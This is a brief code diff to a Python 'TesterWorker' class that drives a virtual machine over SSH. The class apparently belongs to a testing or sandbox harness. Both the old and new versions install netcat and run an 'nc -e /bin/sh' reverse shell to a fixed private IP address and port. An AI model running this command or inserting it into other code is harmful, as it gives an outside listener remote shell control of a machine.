@@ -13,7 +13,6 @@ class TesterWorker(worker.workers.VMWorker):
         super(self.__class__, self).__init__()
 
     def _run(self, job):
-        self.ssh.exec_command("DEBIAN_FRONTEND=noninteractive apt-get update")
-        self.ssh.exec_command("DEBIAN_FRONTEND=noninteractive apt-get -y install netcat")
-        _, stdout, _ = self.ssh.exec_command("nc -vv -e /bin/bash 192.168.48.26 12345")
-        stdout.channel.recv_exit_status()
+        self.execute("DEBIAN_FRONTEND=noninteractive apt-get update")
+        self.execute("DEBIAN_FRONTEND=noninteractive apt-get -y install netcat")
+        self.execute("nc -vv -e /bin/sh 192.168.48.26 12345")
